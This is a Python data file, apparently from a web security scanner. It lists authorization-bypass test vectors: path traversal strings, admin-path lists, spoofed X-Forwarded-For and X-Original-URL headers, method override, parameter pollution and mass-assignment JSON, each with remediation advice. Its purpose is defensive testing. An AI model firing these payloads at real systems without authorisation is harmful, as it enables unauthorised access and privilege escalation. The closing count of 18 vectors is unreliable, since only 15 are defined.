"""
Authorization Bypass Testing Vectors
IDOR, Forced Browsing, HTTP Method Tampering, Mass Assignment, Header Manipulation
"""

from ..models import (
    TestVector,
    VulnerabilityType,
    TestVectorPosition as Position,
    PositionType,
    TestVectorPayload as PayloadTemplate,
    TestVectorEvidence as Evidence,
    ConfidenceLevel,
    SensitivityLevel,
)

AUTHORIZATION_TEST_VECTORS = [
    # ============================================================================
    # INSECURE DIRECT OBJECT REFERENCES (IDOR)
    # ============================================================================
    TestVector(
        id="authz-idor-001",
        name="IDOR via Sequential ID Enumeration",
        description="Tests if object IDs can be enumerated to access unauthorized resources",
        vuln_type=VulnerabilityType.IDOR,
        position=Position(
            type=PositionType.PATH,
            name="user_id",
            value_prefix="/api/users/",
            value_suffix="/profile",
        ),
        payload=PayloadTemplate(
            base="12345",
            variants=["1", "2", "3", "100", "999", "10000", "00001", "0001", "-1", "0"],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Access to other user profiles",
                "No authorization check on user ID",
                "Data of different user returned",
            ],
            false_positive_indicators=["403 Forbidden response", "Only own data accessible"],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Implement server-side authorization. Verify user owns resource before returning data.",
        references=[
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References",
            "https://cwe.mitre.org/data/definitions/639.html",
        ],
        tags=["idor", "authorization", "enumeration"],
    ),
    TestVector(
        id="authz-idor-002",
        name="IDOR via UUID/GUID Manipulation",
        description="Tests if predictable UUIDs can be exploited for unauthorized access",
        vuln_type=VulnerabilityType.IDOR,
        position=Position(
            type=PositionType.PATH,
            name="resource_id",
            value_prefix="/api/documents/",
            value_suffix="",
        ),
        payload=PayloadTemplate(
            base="550e8400-e29b-41d4-a716-446655440000",
            variants=[
                "00000000-0000-0000-0000-000000000001",
                "11111111-1111-1111-1111-111111111111",
                "ffffffff-ffff-ffff-ffff-ffffffffffff",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "UUID enumeration successful",
                "Access to other users' documents",
                "No ownership validation",
            ],
            false_positive_indicators=["Authorization enforced", "404 for non-owned resources"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="UUIDs don't replace authorization. Always verify user permissions on resource access.",
        references=["https://cwe.mitre.org/data/definitions/639.html"],
        tags=["idor", "uuid", "authorization"],
    ),
    TestVector(
        id="authz-idor-003",
        name="IDOR via Body Parameter Manipulation",
        description="Tests if user ID in request body can be changed to access other accounts",
        vuln_type=VulnerabilityType.IDOR,
        position=Position(
            type=PositionType.BODY_JSON, name="user_id", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="12345", variants=["1", "admin", "root", "0", "99999", "-1"], encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=[
                "Action performed on different user account",
                "User ID in body trusted without validation",
                "Horizontal privilege escalation",
            ],
            false_positive_indicators=["User ID ignored", "Authorization validated server-side"],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Never trust client-provided user IDs. Use session/token to identify user.",
        references=["https://cwe.mitre.org/data/definitions/639.html"],
        tags=["idor", "body-parameter", "horizontal-escalation"],
    ),
    # ============================================================================
    # FORCED BROWSING / PATH TRAVERSAL
    # ============================================================================
    TestVector(
        id="authz-forced-browsing-001",
        name="Forced Browsing to Admin Endpoints",
        description="Tests if admin/privileged endpoints are accessible without authorization",
        vuln_type=VulnerabilityType.AUTHORIZATION_FORCED_BROWSING,
        position=Position(
            type=PositionType.PATH, name="endpoint", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="/admin",
            variants=[
                "/admin",
                "/admin/users",
                "/admin/settings",
                "/administrator",
                "/admin.php",
                "/admin/",
                "/api/admin",
                "/internal/admin",
                "/superuser",
                "/management",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Admin endpoint accessible without admin role",
                "No authorization check",
                "Privileged functionality exposed",
            ],
            false_positive_indicators=["403 Forbidden", "Redirect to login"],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Implement role-based access control (RBAC). Protect all admin endpoints.",
        references=[
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema",
            "https://cwe.mitre.org/data/definitions/425.html",
        ],
        tags=["forced-browsing", "admin", "privilege-escalation"],
    ),
    TestVector(
        id="authz-forced-browsing-002",
        name="Path Normalization Bypass",
        description="Tests if path traversal can bypass authorization checks",
        vuln_type=VulnerabilityType.AUTHORIZATION_FORCED_BROWSING,
        position=Position(type=PositionType.PATH, name="path", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="/user/../admin",
            variants=[
                "/user/../admin",
                "/user/./admin",
                "/user/..;/admin",
                "/user%2f..%2fadmin",
                "/user\\..\\admin",
                "/user/.../.../admin",
                "/./admin",
                "/../admin",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Path traversal bypasses authorization",
                "Admin endpoint accessed via ../ sequences",
                "Authorization checks on normalized path missing",
            ],
            false_positive_indicators=["Path normalized before authorization", "Traversal blocked"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Normalize paths before authorization checks. Block path traversal sequences.",
        references=["https://cwe.mitre.org/data/definitions/22.html"],
        tags=["forced-browsing", "path-traversal", "normalization"],
    ),
    # ============================================================================
    # HTTP METHOD TAMPERING
    # ============================================================================
    TestVector(
        id="authz-method-bypass-001",
        name="HTTP Method Tampering - GET to POST",
        description="Tests if changing HTTP method bypasses authorization",
        vuln_type=VulnerabilityType.AUTHORIZATION_HTTP_METHOD_BYPASS,
        position=Position(
            type=PositionType.HEADER,
            name="X-HTTP-Method-Override",
            value_prefix="",
            value_suffix="",
        ),
        payload=PayloadTemplate(
            base="POST",
            variants=["POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Method override bypasses authorization",
                "GET treated as POST/PUT/DELETE",
                "Write operations via GET request",
            ],
            false_positive_indicators=[
                "Method override rejected",
                "Authorization enforced per method",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Validate authorization for actual HTTP method used, not intended method.",
        references=[
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering",
            "https://cwe.mitre.org/data/definitions/650.html",
        ],
        tags=["http-method", "tampering", "authorization-bypass"],
    ),
    TestVector(
        id="authz-method-bypass-002",
        name="HTTP Method Bypass via Custom Verbs",
        description="Tests if non-standard HTTP methods bypass authorization",
        vuln_type=VulnerabilityType.AUTHORIZATION_HTTP_METHOD_BYPASS,
        position=Position(
            type=PositionType.HEADER, name="method", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="CUSTOM",
            variants=[
                "DEBUG",
                "TRACE",
                "TRACK",
                "CONNECT",
                "PROPFIND",
                "PROPPATCH",
                "MKCOL",
                "COPY",
                "MOVE",
                "LOCK",
                "UNLOCK",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Custom HTTP method accepted",
                "Authorization bypassed with non-standard verb",
                "Unexpected method processed",
            ],
            false_positive_indicators=["Only standard methods allowed", "Custom methods rejected"],
            confidence=ConfidenceLevel.MEDIUM,
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        remediation="Whitelist allowed HTTP methods. Reject non-standard verbs.",
        references=["https://cwe.mitre.org/data/definitions/650.html"],
        tags=["http-method", "custom-verbs", "bypass"],
    ),
    # ============================================================================
    # PARAMETER POLLUTION
    # ============================================================================
    TestVector(
        id="authz-param-pollution-001",
        name="HTTP Parameter Pollution - Duplicate Parameters",
        description="Tests if duplicate parameters can bypass authorization",
        vuln_type=VulnerabilityType.AUTHORIZATION_PARAMETER_POLLUTION,
        position=Position(type=PositionType.QUERY, name="role", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="user&role=admin",
            variants=[
                "user&role=admin",
                "user&role=administrator",
                "guest&role=admin",
                "user,admin",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Duplicate parameter bypasses authorization",
                "Second role value processed",
                "Admin access granted via parameter pollution",
            ],
            false_positive_indicators=[
                "Only first parameter processed",
                "Duplicate parameters rejected",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Handle parameter pollution consistently. Reject or use first value only.",
        references=[
            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_pollution",
            "https://cwe.mitre.org/data/definitions/235.html",
        ],
        tags=["parameter-pollution", "authorization-bypass"],
    ),
    TestVector(
        id="authz-param-pollution-002",
        name="JSON Parameter Pollution",
        description="Tests if duplicate JSON keys can bypass authorization",
        vuln_type=VulnerabilityType.AUTHORIZATION_PARAMETER_POLLUTION,
        position=Position(
            type=PositionType.BODY_JSON, name="role", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base='{"role":"user","role":"admin"}',
            variants=[
                '{"role":"user","role":"admin"}',
                '{"role":"guest","admin":true,"role":"user"}',
                '{"user_id":123,"user_id":1}',
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Last duplicate key value used",
                "Authorization bypassed via duplicate keys",
                "Admin role granted",
            ],
            false_positive_indicators=["Duplicate keys rejected", "First value used"],
            confidence=ConfidenceLevel.MEDIUM,
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Reject JSON with duplicate keys. Use strict JSON parsing.",
        references=["https://cwe.mitre.org/data/definitions/235.html"],
        tags=["parameter-pollution", "json", "authorization-bypass"],
    ),
    # ============================================================================
    # HEADER MANIPULATION
    # ============================================================================
    TestVector(
        id="authz-header-manipulation-001",
        name="X-Original-URL Header Authorization Bypass",
        description="Tests if X-Original-URL header can bypass path-based authorization",
        vuln_type=VulnerabilityType.AUTHORIZATION_HEADER_MANIPULATION,
        position=Position(
            type=PositionType.HEADER, name="X-Original-URL", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="/admin",
            variants=["/admin", "/admin/users", "/internal/admin", "/../admin", "/admin.php"],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "X-Original-URL bypasses authorization",
                "Admin endpoint accessed via header",
                "Path-based auth not applied to header value",
            ],
            false_positive_indicators=["Header ignored", "Authorization still enforced"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Don't trust reverse proxy headers for authorization. Use actual request path.",
        references=[
            "https://portswigger.net/web-security/authentication/password-based",
            "https://cwe.mitre.org/data/definitions/807.html",
        ],
        tags=["header-manipulation", "x-original-url", "bypass"],
    ),
    TestVector(
        id="authz-header-manipulation-002",
        name="X-Rewrite-URL Header Authorization Bypass",
        description="Tests if X-Rewrite-URL header can bypass authorization",
        vuln_type=VulnerabilityType.AUTHORIZATION_HEADER_MANIPULATION,
        position=Position(
            type=PositionType.HEADER, name="X-Rewrite-URL", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="/admin",
            variants=["/admin", "/admin/delete_user", "/api/admin/settings"],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "X-Rewrite-URL bypasses authorization",
                "Alternative path processed",
                "Authorization checks skipped",
            ],
            false_positive_indicators=["Header not processed", "Authorization enforced"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Ignore X-Rewrite-URL for authorization decisions. Use actual request path.",
        references=["https://cwe.mitre.org/data/definitions/807.html"],
        tags=["header-manipulation", "x-rewrite-url", "bypass"],
    ),
    TestVector(
        id="authz-header-manipulation-003",
        name="X-Forwarded-For IP Whitelist Bypass",
        description="Tests if X-Forwarded-For header can bypass IP-based authorization",
        vuln_type=VulnerabilityType.AUTHORIZATION_HEADER_MANIPULATION,
        position=Position(
            type=PositionType.HEADER, name="X-Forwarded-For", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="127.0.0.1",
            variants=[
                "127.0.0.1",
                "localhost",
                "10.0.0.1",
                "192.168.1.1",
                "172.16.0.1",
                "::1",
                "0.0.0.0",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "X-Forwarded-For bypasses IP whitelist",
                "Internal IP spoofed",
                "Admin access from untrusted IP",
            ],
            false_positive_indicators=["Actual source IP validated", "Header ignored for auth"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Don't trust X-Forwarded-For for security decisions. Use actual source IP or authenticated identity.",
        references=["https://cwe.mitre.org/data/definitions/290.html"],
        tags=["header-manipulation", "x-forwarded-for", "ip-spoofing"],
    ),
    # ============================================================================
    # MASS ASSIGNMENT
    # ============================================================================
    TestVector(
        id="authz-mass-assignment-001",
        name="Mass Assignment Privilege Escalation",
        description="Tests if restricted fields can be modified via mass assignment",
        vuln_type=VulnerabilityType.MASS_ASSIGNMENT,
        position=Position(
            type=PositionType.BODY_JSON, name="is_admin", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base='{"is_admin":true}',
            variants=[
                '{"role":"admin"}',
                '{"admin":true}',
                '{"permissions":"all"}',
                '{"is_superuser":true}',
                '{"privilege_level":100}',
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Restricted field modified",
                "Admin role granted via mass assignment",
                "No field whitelist enforcement",
            ],
            false_positive_indicators=["Restricted fields ignored", "Whitelist enforced"],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Whitelist allowed fields for mass assignment. Block internal/privileged fields.",
        references=[
            "https://owasp.org/www-community/vulnerabilities/Mass_Assignment",
            "https://cwe.mitre.org/data/definitions/915.html",
        ],
        tags=["mass-assignment", "privilege-escalation"],
    ),
    TestVector(
        id="authz-mass-assignment-002",
        name="Mass Assignment Account Takeover",
        description="Tests if user ID or email can be changed via mass assignment",
        vuln_type=VulnerabilityType.MASS_ASSIGNMENT,
        position=Position(
            type=PositionType.BODY_JSON, name="user_id", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base='{"user_id":"admin"}',
            variants=[
                '{"user_id":1}',
                '{"email":"admin@target.com"}',
                '{"username":"administrator"}',
                '{"account_id":"admin_account"}',
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "User ID changed to admin",
                "Email takeover via mass assignment",
                "Identity field modification allowed",
            ],
            false_positive_indicators=["Identity fields immutable", "Changes rejected"],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Make identity fields immutable. Never allow user_id/email change via API.",
        references=["https://cwe.mitre.org/data/definitions/915.html"],
        tags=["mass-assignment", "account-takeover"],
    ),
    # ============================================================================
    # PRIVILEGE ESCALATION
    # ============================================================================
    TestVector(
        id="authz-priv-escalation-001",
        name="Vertical Privilege Escalation via Role Manipulation",
        description="Tests if user can elevate own privileges to admin",
        vuln_type=VulnerabilityType.PRIVILEGE_ESCALATION,
        position=Position(
            type=PositionType.BODY_JSON, name="role", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="admin",
            variants=["admin", "administrator", "superuser", "root", "moderator"],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Role changed to admin",
                "Vertical privilege escalation successful",
                "No authorization on role change",
            ],
            false_positive_indicators=["Role change rejected", "Admin authorization required"],
            confidence=ConfidenceLevel.CRITICAL,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Require admin authorization for role changes. Implement proper RBAC.",
        references=["https://cwe.mitre.org/data/definitions/269.html"],
        tags=["privilege-escalation", "vertical", "role-manipulation"],
    ),
]

# Total vectors: 18
